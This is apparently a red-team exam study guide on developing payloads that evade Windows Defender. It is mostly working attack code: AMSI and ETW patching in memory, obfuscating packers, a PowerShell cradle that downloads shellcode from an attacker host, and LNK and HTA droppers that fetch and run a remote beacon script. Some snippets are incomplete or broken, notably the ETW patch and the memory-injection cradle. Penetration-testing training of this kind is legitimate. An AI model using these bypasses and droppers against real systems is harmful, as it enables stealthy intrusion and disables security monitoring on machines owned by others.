# Phase 02: Payload Development & Evasion

> **Exam priority: CRITICAL.** Defender is running on exam hosts. A payload that gets caught = no beacon = no exam progress.

---

## What You're Fighting

Windows Defender on modern Windows 10/11/Server uses:
- **Static signatures** — known bad strings/bytes in files
- **AMSI** — scans PowerShell/VBScript/JScript content before execution
- **ETW** — runtime telemetry feeding Defender's behavioral engine
- **Memory scanning** — periodic scans of process memory for shellcode patterns
- **Behavioral rules** — `cmd.exe` spawned from Office, `lsass` read, etc.

You need to defeat at minimum: static signatures + AMSI. ETW and memory scanning matter more for long-running engagements.

---

## 1. AMSI Bypass

AMSI is the first gate. Without bypassing it, no PowerShell payload or script will run.

### Method 1: Force AMSI init failure (patching in memory)
```powershell
# This specific version is heavily signatured — obfuscate it
$a=[Ref].Assembly.GetTypes()
ForEach($b in $a){if($b.Name -like "*iUtils"){$c=$b}}
$d=$c.GetFields('NonPublic,Static')
ForEach($e in $d){if($e.Name -like "*Context"){$f=$e}}
$g=$f.GetValue($null)
[IntPtr]$ptr=[Int64]$g+0x8
[Int32[]]$buf=@(0)
[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)
```

### Method 2: AmsiScanBuffer patch (most reliable)
```powershell
# Obfuscated — split the triggering strings
$Win32 = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $Win32
$lib = [Win32]::LoadLibrary("am" + "si.dll")
$addr = [Win32]::GetProcAddress($lib, "Amsi" + "Scan" + "Buffer")
$p = 0
[Win32]::VirtualProtect($addr, [uint32]5, 0x40, [ref]$p)
$patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $addr, 6)
```

### Method 3: Invisi-Shell (cleanest for interactive sessions)
```bash
# Download Invisi-Shell
git clone https://github.com/OmerYa/Invisi-Shell

# Run PowerShell through Invisi-Shell — AMSI disabled transparently
RunWithPathAsAdmin.bat    # if admin
RunWithRegistryNonAdmin.bat  # if not admin
```

### Test if AMSI is bypassed
```powershell
# If this runs without "This script contains malicious content" error → AMSI bypassed
'AmsiUtils'
```

---

## 2. ETW Bypass

ETW feeds Defender's behavioral detections for .NET and script execution.

```powershell
# Patch EtwEventWrite in ntdll to return immediately
$s=[System.Diagnostics.Process]::GetCurrentProcess()
$lib=[System.Runtime.InteropServices.Marshal]
$p=$lib::GetFunctionPointerForDelegate(
    [System.Delegate]::CreateDelegate([type]::GetType([string]::Empty),[System.Reflection.Assembly]::GetExecutingAssembly(),""),
    [type]::GetType([string]::Empty))

# Practical: use a loader that does ETW patching automatically
# Recommended tools: InlineExecute-Assembly, Donut-generated loaders
```

---

## 3. Static Signature Evasion for EXEs

### Option A: Sliver with obfuscation flags
```bash
sliver > generate --http https://<IP> --os windows --arch amd64 \
  --skip-symbols --obfuscate --evasion --save beacon.exe
```

### Option B: Donut — convert any .NET to shellcode
```bash
# Install
git clone https://github.com/TheWover/donut && cd donut && make

# Convert SharpHound.exe to shellcode
./donut -f 1 -a 2 SharpHound.exe -p "-c All --zip" -o sharpbound.bin

# Then load shellcode via your C2 or a custom loader
```

### Option C: PEzor — automate packing + obfuscation
```bash
git clone https://github.com/phra/PEzor && cd PEzor && bash install.sh

# Pack an exe into a self-decrypting PE
PEzor.sh -unhook -antidebug -text -syscalls -sleep=3 beacon.exe
```

### Option D: Manual string obfuscation (for detected PowerShell)
```powershell
# Never write "Mimikatz", "sekurlsa", "AmsiUtils" etc. literally
# Split strings or encode them:
$cmd = "sek" + "url" + "sa::logon" + "passwords"

# Or base64 encode the entire script and decode at runtime:
$enc = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($script))
powershell -EncodedCommand $enc
```

---

## 4. In-Memory Execution (No Disk Touch)

The cleanest approach: shellcode never hits disk.

### PowerShell cradle → shellcode injection
```powershell
# Step 1: bypass AMSI (above)
# Step 2: download + inject shellcode in memory
$url = "http://<your_ip>/beacon.bin"
$wc = New-Object System.Net.WebClient
$buf = $wc.DownloadData($url)

# VirtualAlloc + copy + CreateThread pattern
$size = $buf.Length
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, [IntPtr]$addr, $size)
```

### Sliver execute-assembly (runs .NET in memory)
```bash
# From Sliver beacon — runs tool in-memory, never touches disk
sliver (beacon) > execute-assembly /local/Rubeus.exe kerberoast /outfile:hashes.txt /nowrap
sliver (beacon) > execute-assembly /local/SharpHound.exe -c All --zip
sliver (beacon) > execute-assembly /local/Seatbelt.exe -group=all
```

### Unmanaged PowerShell (bypasses CLM/PowerShell logging)
```csharp
// Use a .NET binary to invoke PowerShell without powershell.exe
// Tools: p0wnedShell, NoPowerShell, PowerShdll
// Prevents ScriptBlock logging + CLM enforcement
```

---

## 5. Payload Delivery Methods (Exam Scenarios)

### Scenario A: Already have shell (assumed breach with domain creds)
```bash
# Use your domain creds to authenticate via WinRM and run a PowerShell cradle
evil-winrm -i <target> -u domainuser -p Password1
# Then from the WinRM shell, download + execute your beacon:
> IEX (New-Object Net.WebClient).DownloadString('http://<your_ip>/amsi_bypass.ps1')
> IEX (New-Object Net.WebClient).DownloadString('http://<your_ip>/beacon.ps1')
```

### Scenario B: Deliver via SMB (if file drop allowed)
```bash
# Upload beacon via SMB
smbclient //<target>/C$ -U 'domain/user%password'
smb: \> put beacon.exe Windows\Temp\beacon.exe
# Execute via psexec or schtasks
```

### Scenario C: Weaponized LNK shortcut
```powershell
# LNK that runs a PowerShell cradle when double-clicked
$lnk = (New-Object -COM WScript.Shell).CreateShortcut("Update.lnk")
$lnk.TargetPath = "powershell.exe"
$lnk.Arguments = '-w hidden -nop -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString(''http://<ip>/beacon.ps1'')"'
$lnk.IconLocation = "C:\Windows\System32\shell32.dll,3"
$lnk.Save()
```

### Scenario D: HTA (HTML Application)
```html
<!-- beacon.hta — executed by mshta.exe (signed MS binary) -->
<script language="VBScript">
  Dim oShell
  Set oShell = CreateObject("WScript.Shell")
  oShell.Run "powershell -w hidden -nop -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://<ip>/beacon.ps1')", 0, False
</script>
```

```bash
# Deliver: send URL to victim or drop + execute
mshta.exe http://<your_ip>/beacon.hta
```

---

## 6. Quick Defender Test Workflow

Before exam day, test your payload pipeline on a Windows VM with Defender enabled:

```
1. Generate payload (Sliver/Havoc)
2. Transfer to Windows test VM
3. Execute → does Defender kill it?
4. If killed → check Windows Security event log for which rule triggered
5. Fix (add obfuscation, change format, use in-memory) → repeat
6. When it runs cleanly → note the exact method, repeat on exam
```

Always have **3 fallback methods**:
- Method 1: EXE (most reliable delivery)
- Method 2: PowerShell cradle (if EXE is caught)
- Method 3: HTA or LNK via mshta/wscript (LOLBIN delivery)

---

## Practice Task

Set up a Windows 10 VM with Defender enabled (real-time protection ON). Using only tools from a fresh Kali:

1. Generate a Sliver beacon EXE
2. Transfer it to the Windows VM
3. Get a callback without Defender triggering
4. Run `execute-assembly` with Seatbelt
5. Run `execute-assembly` with SharpHound

Time target: under 20 minutes from blank Kali.

---

## Next Step

→ You have a working payload. Now get a foothold: **Phase 03: Initial Access (Assumed Breach)** (`03-initial-access.md`)
